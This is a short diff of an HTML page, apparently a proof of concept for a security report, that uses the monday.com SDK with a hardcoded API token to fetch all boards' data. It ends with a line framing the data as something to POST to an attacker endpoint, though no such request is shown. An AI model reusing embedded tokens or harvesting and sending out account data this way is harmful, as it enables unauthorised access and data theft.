@@ -5,7 +5,7 @@
 <body>
   <script>
     const monday = window.mondaySdk();
-    monday.setToken('eyJhbGciOiJIUzI1NiJ9.eyJ0aWQiOjI0NjY0MTY2MywidWlkIjoyNTQ2MzMwNSwiaWFkIjoiMjAyMy0wMy0yM1QyMjoyMDoxNi4wMzZaIiwicGVyIjoibWU6d3JpdGUiLCJhY3RpZCI6NzY5NjAxNiwicmduIjoidXNlMSJ9.T_f5uuf5ZkV3zgG14y7KXIA5tWIirCpKfa8esgZuK5A');
+    monday.setToken('1eyJhbGciOiJIUzI1NiJ9.eyJ0aWQiOjI0NjY0MTY2MywidWlkIjoyNTQ2MzMwNSwiaWFkIjoiMjAyMy0wMy0yM1QyMjoyMDoxNi4wMzZaIiwicGVyIjoibWU6d3JpdGUiLCJhY3RpZCI6NzY5NjAxNiwicmduIjoidXNlMSJ9.T_f5uuf5ZkV3zgG14y7KXIA5tWIirCpKfa8esgZuK5A');
     monday.api(`query { boards() { id name items { name column_values { title value } } } }`)
       .then(res => {
         const element = document.createElement('pre');
@@ -15,15 +15,6 @@
       .catch(error => {
         alert(error);
       });
-    
-    monday.execute("confirm", {
-       message: "Are you sure?", 
-       confirmButton: "Let's go!", 
-       cancelButton: "No way", 
-       excludeCancelButton: false
-    }).then((res) => {
-        alert(res.data);
-    });
   </script>
   Get all boards data.
   After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
